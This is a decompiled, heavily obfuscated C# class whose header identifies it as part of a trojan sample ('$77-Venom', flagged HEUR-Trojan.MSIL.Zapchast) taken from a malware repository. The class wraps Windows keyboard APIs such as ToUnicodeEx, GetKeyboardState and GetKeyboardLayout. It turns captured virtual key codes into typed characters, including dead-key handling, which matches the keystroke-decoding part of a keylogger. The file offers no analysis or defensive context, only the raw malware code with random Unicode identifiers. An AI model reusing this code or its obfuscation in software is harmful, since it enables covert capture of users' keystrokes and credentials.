// Decompiled with JetBrains decompiler
// Type: 江왤牂諯Ծ䪈ᶠ㕡葕㼮嘙઩揱뷮绍赁꧒釣䗷
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.MSIL.Zapchast.gen-2e1eda10e2bbd19418706a23888807e50c0407eb191cc26d541c85279193c3db.exe

using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

internal static class 江왤牂諯Ծ䪈ᶠ㕡葕\uED61㼮嘙\u0AA9揱뷮绍赁꧒釣䗷
{
  public const byte \uFFFD丛鸟됮睭懞类\uE5A3\uF2E8\uF537溙锤貔ਕ\uE0DFׁ\u2856탺숞樫 = 16;
  public const byte 饥ᶺ恈ꩇ黼钂\u232E䶀霥Ｊ鰛\uFFFD둲抛鷍ಔ覃砎䯟㠤 = 20;
  public const byte \uFFFD䩚䣋\u232A\uFBBDぞ㜈宏䯥蛡䫈鄄Ӗ\u24EA팮\uFD40ᎌ圮\uE8CE㚈 = 144;
  public const byte \u2E48ꞌ룊ﴚ䑮㖈ᚹ暟역塾䊾邏댍女\uF233ᕘ맗럓藾黿 = 160;
  public const byte 㓀\uE48E\uF1BBᬮℋ\u3385\u0C76\uFFFD\u279F㿯㲠\uE65A㴪Þ\uEB4C璟ⷼ傴ꨄ꺉 = 161;
  public const byte \uE2DD㻑\u1803ࣺ뙸뢄婳촎㟂졅碷\uE4E0ᐲ\uEB0C쇺Ꮪ醹ڋ퀰ߨ = 162;
  public const byte 䝅窱粺장霳鶜\u329E쥈ꌙ霹퐎㢇ೈ鷕串ᗗ쎏訑ꁧ䥠 = 163;
  public const byte \uFFFD㺒ꮋ㵸\uFFFD㱹\u0A7D坡\uFFFD씓แ幙欅떵囙쭬ⶒ䦯蜶麁 = 164;
  public const byte ꑬ䞷\u05EE횟넋嬨\u2710\uF0CA\u2790㡫\u2595㽖珞㥌輥\uECC2鎈\uFFFD诠差 = 165;
  public const byte 藺鋻ꭇꪳ驵됏쾁绌䒍\uFFFD뭶믯립\u27B9ά\u2F81狁亚鎯\uFDCC = 91;
  public const byte 漅찶朢櫟䂻擀叡뱰雌\uFFFD弆偘\uE474쯆\uE815橷ꅂᚿڄㄥ = 92;
  public const byte \uFD4F\uE3C0㶲\u246E뎮\u2BC7퇺ꛪ㒄祅왬㷹擲\u2612岝囬㖁懓\u3368᷑ = 145;
  public const byte 뼏\u2F8A炪꾱攬ፕ뒼\uFFFD輭鼤슧缄\uF410驋됀\u1A7DꃈⱠ귞\uF547 = 45;
  public const byte 쇅袳緧\uF3C3\uF39B\uEDDA崕䕄\uE4B2쿣ȭ夈峅鉶䘮ᘛ\uF521꧐펛読 = 17;
  public const byte 䢎匡谤㞠樓\u0D84\u2B08\uEC5B\uE698ு劭葦팒씢\uF35F䪽\u2694ℭᢎꃅ = 18;
  public const byte 涚ꤧ쑐鎧Ƙ\u220C\uE2D7鸊쫐뙆\u1CBC볊\uE214괳ᳰ鹰綽\u0A60\uE980䳶 = 231;
  private static int 𢡊먏厒\u2B2F\uFFFDꬦ诡燨馴ᢋ诘传ꨈ怭\uF4D6轤\uEEB5ꨞ뉎ꥠ = 0;
  private static int \uE886뻪梠䥺\u2A16\u2B49剒鈅䇧\u2737㳝\u335B拮ỵ㵯鹳虿੩ꊅᆞ = 0;
  private static byte[] 橵輕䦨櫣윋꽰桀拉ﺱ䜠뽰ꯗ촇쇏㳝粺\uEE2A鰦篷\uF5ED = new byte[256];
  private static bool Ꮸ飨슈\uF7F7ଷ窮䲭\u0010\u2651\uF38A銚ை꺷㠉敡亴\u33EE\uFFFD㸇㤔 = false;

  internal static void \u02F4ᜃ㶂\u2F5Dߌ\uE19F\uF3A6娵ꖀ婯䢬ﾣ\uF591\uEF3B갡\uFFFD夊濪儭\uFFFD(
    int virtualKeyCode,
    int fuState,
    out char[] chars)
  {
    IntPtr dwhkl = 江왤牂諯Ծ䪈ᶠ㕡葕\uED61㼮嘙\u0AA9揱뷮绍赁꧒釣䗷.编\uEF18\uFFFD盈н堞\uECAA率\u29E5ৢ涚턥\u0835캿笪\u1FCE\uF26B甋漞\uE6F8();
    int scanCode = 江왤牂諯Ծ䪈ᶠ㕡葕\uED61㼮嘙\u0AA9揱뷮绍赁꧒釣䗷.\uF27A杚咥㳋\uEA34皦군ꃸቋ\uF8FDⵉ쭣䡉支ੀ寓렾둈웓䬪(virtualKeyCode, 0, dwhkl);
    江왤牂諯Ծ䪈ᶠ㕡葕\uED61㼮嘙\u0AA9揱뷮绍赁꧒釣䗷.\u2574树Č䮤đ叹恊缘Ꙡ긖\uE753㥽뒇얝瑼嶭摼쟙墽缉(virtualKeyCode, scanCode, fuState, dwhkl, out chars);
  }

  internal static void \u2A73騸髇ᄬ椌洨\u32BE殒헝ஐ漾薙뼭\uFFFD漒뢶ﱌꃩ흩\uF410(
    int virtualKeyCode,
    int scanCode,
    int fuState,
    out char[] chars)
  {
    IntPtr dwhkl = 江왤牂諯Ծ䪈ᶠ㕡葕\uED61㼮嘙\u0AA9揱뷮绍赁꧒釣䗷.编\uEF18\uFFFD盈н堞\uECAA率\u29E5ৢ涚턥\u0835캿笪\u1FCE\uF26B甋漞\uE6F8();
    江왤牂諯Ծ䪈ᶠ㕡葕\uED61㼮嘙\u0AA9揱뷮绍赁꧒釣䗷.\u2574树Č䮤đ叹恊缘Ꙡ긖\uE753㥽뒇얝瑼嶭摼쟙墽缉(virtualKeyCode, scanCode, fuState, dwhkl, out chars);
  }

  internal static void \u2574树Č䮤đ叹恊缘Ꙡ긖\uE753㥽뒇얝瑼嶭摼쟙墽缉(
    int virtualKeyCode,
    int scanCode,
    int fuState,
    IntPtr dwhkl,
    out char[] chars)
  {
    StringBuilder pwszBuff1 = new StringBuilder(64);
    赭Ꝛ\u2774\u20A6\uE594渌肵\uFFFD\u2270ꌢ苟頊Ļđ팂胏\u32DF噾౬\uEBA6 赭Ꝛ渌肵ꌢ苟頊Ļđ팂胏噾౬ = 赭Ꝛ\u2774\u20A6\uE594渌肵\uFFFD\u2270ꌢ苟頊Ļđ팂胏\u32DF噾౬\uEBA6.鳢\uE169어헙Ⱡ\uEF88\uFFFD릚岳텷鶎\uE5E7\u0EF7飘뮀\u2A70ⶳ莭횇䙄();
    byte[] lpKeyState = 赭Ꝛ渌肵ꌢ苟頊Ļđ팂胏噾౬.\u32C3褥돗䄬ꉢ\u2B18\u2231㘛歳ਟ伌蛇重\u1371覺骴ᗜ\uFFE6轙䞢();
    bool flag = false;
    if (赭Ꝛ渌肵ꌢ苟頊Ļđ팂胏噾౬.ᇇ疚ϖク\uF1B8盥\u31E1\u2543凨\u19AF꘣鱇\uEBA0뾊\uE4CCᵓ뻍ȿ\u0A0B蠃(Keys.ShiftKey))
      lpKeyState[16] = (byte) 128;
    if (赭Ꝛ渌肵ꌢ苟頊Ļđ팂胏噾౬.\uE61D蕊鷑䟢阆哋亻䥼飐\u0E62\uF12F쌛芿ᑨ溚ᵀ㿂乒薞\uF061(Keys.Capital))
      lpKeyState[20] = (byte) 1;
    switch (江왤牂諯Ծ䪈ᶠ㕡葕\uED61㼮嘙\u0AA9揱뷮绍赁꧒釣䗷.싿\u2009讍Â䊅핊\uFFFD馐\uE7DA㗌\u2766̮짿㲨ᒎ\uFFFD\uEAC8旱૨䪞(virtualKeyCode, scanCode, lpKeyState, pwszBuff1, pwszBuff1.Capacity, fuState, dwhkl))
    {
      case -1:
        flag = true;
        江왤牂諯Ծ䪈ᶠ㕡葕\uED61㼮嘙\u0AA9揱뷮绍赁꧒釣䗷.\uF781ꃒ䙀\uF1AA뵫쩤퐐鱽\u2749䄸눽\uEF82珝瞂\u26C6閚\u29AD옷\uFFFD쁇(virtualKeyCode, scanCode, dwhkl);
        chars = (char[]) null;
        break;
      case 0:
        chars = (char[]) null;
        break;
      case 1:
        if (pwszBuff1.Length > 0)
        {
          chars = new char[1]{ pwszBuff1[0] };
          break;
        }
        chars = (char[]) null;
        break;
      default:
        if (pwszBuff1.Length > 1)
        {
          chars = new char[2]{ pwszBuff1[0], pwszBuff1[1] };
          break;
        }
        chars = new char[1]{ pwszBuff1[0] };
        break;
    }
    if (江왤牂諯Ծ䪈ᶠ㕡葕\uED61㼮嘙\u0AA9揱뷮绍赁꧒釣䗷.𢡊먏厒\u2B2F\uFFFDꬦ诡燨馴ᢋ诘传ꨈ怭\uF4D6轤\uEEB5ꨞ뉎ꥠ != 0 && 江왤牂諯Ծ䪈ᶠ㕡葕\uED61㼮嘙\u0AA9揱뷮绍赁꧒釣䗷.Ꮸ飨슈\uF7F7ଷ窮䲭\u0010\u2651\uF38A銚ை꺷㠉敡亴\u33EE\uFFFD㸇㤔)
    {
      if (chars == null)
        return;
      StringBuilder pwszBuff2 = new StringBuilder(5);
      江왤牂諯Ծ䪈ᶠ㕡葕\uED61㼮嘙\u0AA9揱뷮绍赁꧒釣䗷.싿\u2009讍Â䊅핊\uFFFD馐\uE7DA㗌\u2766̮짿㲨ᒎ\uFFFD\uEAC8旱૨䪞(江왤牂諯Ծ䪈ᶠ㕡葕\uED61㼮嘙\u0AA9揱뷮绍赁꧒釣䗷.𢡊먏厒\u2B2F\uFFFDꬦ诡燨馴ᢋ诘传ꨈ怭\uF4D6轤\uEEB5ꨞ뉎ꥠ, 江왤牂諯Ծ䪈ᶠ㕡葕\uED61㼮嘙\u0AA9揱뷮绍赁꧒釣䗷.\uE886뻪梠䥺\u2A16\u2B49剒鈅䇧\u2737㳝\u335B拮ỵ㵯鹳虿੩ꊅᆞ, 江왤牂諯Ծ䪈ᶠ㕡葕\uED61㼮嘙\u0AA9揱뷮绍赁꧒釣䗷.橵輕䦨櫣윋꽰桀拉ﺱ䜠뽰ꯗ촇쇏㳝粺\uEE2A鰦篷\uF5ED, pwszBuff2, pwszBuff2.Capacity, 0, dwhkl);
      江왤牂諯Ծ䪈ᶠ㕡葕\uED61㼮嘙\u0AA9揱뷮绍赁꧒釣䗷.Ꮸ飨슈\uF7F7ଷ窮䲭\u0010\u2651\uF38A銚ை꺷㠉敡亴\u33EE\uFFFD㸇㤔 = false;
      江왤牂諯Ծ䪈ᶠ㕡葕\uED61㼮嘙\u0AA9揱뷮绍赁꧒釣䗷.𢡊먏厒\u2B2F\uFFFDꬦ诡燨馴ᢋ诘传ꨈ怭\uF4D6轤\uEEB5ꨞ뉎ꥠ = 0;
    }
    else
    {
      江왤牂諯Ծ䪈ᶠ㕡葕\uED61㼮嘙\u0AA9揱뷮绍赁꧒釣䗷.\uE886뻪梠䥺\u2A16\u2B49剒鈅䇧\u2737㳝\u335B拮ỵ㵯鹳虿੩ꊅᆞ = scanCode;
      江왤牂諯Ծ䪈ᶠ㕡葕\uED61㼮嘙\u0AA9揱뷮绍赁꧒釣䗷.𢡊먏厒\u2B2F\uFFFDꬦ诡燨馴ᢋ诘传ꨈ怭\uF4D6轤\uEEB5ꨞ뉎ꥠ = virtualKeyCode;
      江왤牂諯Ծ䪈ᶠ㕡葕\uED61㼮嘙\u0AA9揱뷮绍赁꧒釣䗷.Ꮸ飨슈\uF7F7ଷ窮䲭\u0010\u2651\uF38A銚ை꺷㠉敡亴\u33EE\uFFFD㸇㤔 = flag;
      江왤牂諯Ծ䪈ᶠ㕡葕\uED61㼮嘙\u0AA9揱뷮绍赁꧒釣䗷.橵輕䦨櫣윋꽰桀拉ﺱ䜠뽰ꯗ촇쇏㳝粺\uEE2A鰦篷\uF5ED = (byte[]) lpKeyState.Clone();
    }
  }

  private static void \uF781ꃒ䙀\uF1AA뵫쩤퐐鱽\u2749䄸눽\uEF82珝瞂\u26C6閚\u29AD옷\uFFFD쁇(
    int vk,
    int sc,
    IntPtr hkl)
  {
    StringBuilder pwszBuff = new StringBuilder(10);
    byte[] lpKeyState;
    do
    {
      lpKeyState = new byte[(int) byte.MaxValue];
    }
    while (江왤牂諯Ծ䪈ᶠ㕡葕\uED61㼮嘙\u0AA9揱뷮绍赁꧒釣䗷.싿\u2009讍Â䊅핊\uFFFD馐\uE7DA㗌\u2766̮짿㲨ᒎ\uFFFD\uEAC8旱૨䪞(vk, sc, lpKeyState, pwszBuff, pwszBuff.Capacity, 0, hkl) < 0);
  }

  private static IntPtr 编\uEF18\uFFFD盈н堞\uECAA率\u29E5ৢ涚턥\u0835캿笪\u1FCE\uF26B甋漞\uE6F8() => 江왤牂諯Ծ䪈ᶠ㕡葕\uED61㼮嘙\u0AA9揱뷮绍赁꧒釣䗷.\uF1AC神傌\u0EE6㡯爠䒢\uF4AF\uE54E䉋䕴ꊛ雳\u238D䨾鹞䜍\u33F5\u2FE9ṟ(豴뭒킖\uF076秅ୈ\uEE53\u29B7횾彉\uE434栅憎뀯魷줣逰숴쑦ⱌ.哋暯\uED1E竸槊\u2EA7\u3225\uE55C\uF8A0풃櫂\uFFFD\uE99E憎䥽\uE84Dꅢ쑒ꕙ\uE96C(豴뭒킖\uF076秅ୈ\uEE53\u29B7횾彉\uE434栅憎뀯魷줣逰숴쑦ⱌ.銰欌Ի\uFFFDₕ؅慊폫\uF8D0Ԩ媒咼\uE0E2\u33AB\uEDBB유䒪\uFFFD\u2718鏣(), out int _));

  [Obsolete("Use ToUnicodeEx instead")]
  [DllImport("user32.dll")]
  public static extern int ToAscii(
    int uVirtKey,
    int uScanCode,
    byte[] lpbKeyState,
    byte[] lpwTransKey,
    int fuState);

  [DllImport("user32.dll", EntryPoint = "ToUnicodeEx")]
  public static extern int 싿\u2009讍Â䊅핊\uFFFD馐\uE7DA㗌\u2766̮짿㲨ᒎ\uFFFD\uEAC8旱૨䪞(
    int wVirtKey,
    int wScanCode,
    byte[] lpKeyState,
    [MarshalAs(UnmanagedType.LPWStr), Out] StringBuilder pwszBuff,
    int cchBuff,
    int wFlags,
    IntPtr dwhkl);

  [DllImport("user32.dll", EntryPoint = "GetKeyboardState")]
  public static extern int \u0B3A\u2727查쯾ᯞ傂\uE783\u4DE8\u0834ܭᤞ䰗굤䇎㼨퍑\uF6FE彭\uF825氄(byte[] pbKeyState);

  [DllImport("user32.dll", EntryPoint = "GetKeyState", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
  public static extern short 먂\uE415銐걷햷뙩\uF379쓍틻㡁\uF0D5戦\uE42A鞇뚌偂쉙諾㕖ᾂ(int vKey);

  [DllImport("user32.dll", EntryPoint = "MapVirtualKeyEx", CharSet = CharSet.Auto)]
  internal static extern int \uF27A杚咥㳋\uEA34皦군ꃸቋ\uF8FDⵉ쭣䡉支ੀ寓렾둈웓䬪(
    int uCode,
    int uMapType,
    IntPtr dwhkl);

  [DllImport("user32.dll", EntryPoint = "GetKeyboardLayout", CharSet = CharSet.Auto)]
  internal static extern IntPtr \uF1AC神傌\u0EE6㡯爠䒢\uF4AF\uE54E䉋䕴ꊛ雳\u238D䨾鹞䜍\u33F5\u2FE9ṟ(
    int dwLayout);

  internal enum 踃\u0C91鸶饍䬊湺㽒䠡막嘯颧镘輟浚\uE20F燿ዖ\uE8D3怩䓯
  {
    쥀答爛濫읽芧죜옪\u20AD騣\uFFFD楘뭰츫羼諪ꕳꬫ\uFFFD䆜,
    ᆧᅸ嚡\uA8FEග뀃㯘ᱍ\uFFFD뮈\uF216焎耾\u2885\uEFE0\uF20C\uE420랏\uFFFD㫣,
    䴺幭\uE5AA袮붅\u0DE2\uFFFD\uF13E竮톓有\uFFFD３꺄\uE015\uE830绍\u2622裒첷,
    \uE9A9狅䰎\uE484딋죯䮖櫧\uFFFD贵岖\uE4E0롚쩸\uF097쇣̐财ꠇ头,
  }
}
